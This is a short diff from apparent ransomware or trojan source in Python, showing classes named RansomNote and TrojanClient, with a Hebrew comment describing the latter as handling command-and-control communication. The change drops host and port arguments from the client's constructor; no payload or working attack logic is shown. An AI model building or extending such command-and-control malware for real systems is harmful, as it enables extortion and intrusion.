@@ -114,7 +114,7 @@ class RansomNote:
 class TrojanClient:
     # מחלקה שמבצעת את תקשורת השליטה לפי פרוטוקול
 
-    def __init__(self, host, port, folder):
+    def __init__(self, folder):
         self.folder = folder
         self.connection = SecureSocketClient().connect_tls_socket()
 
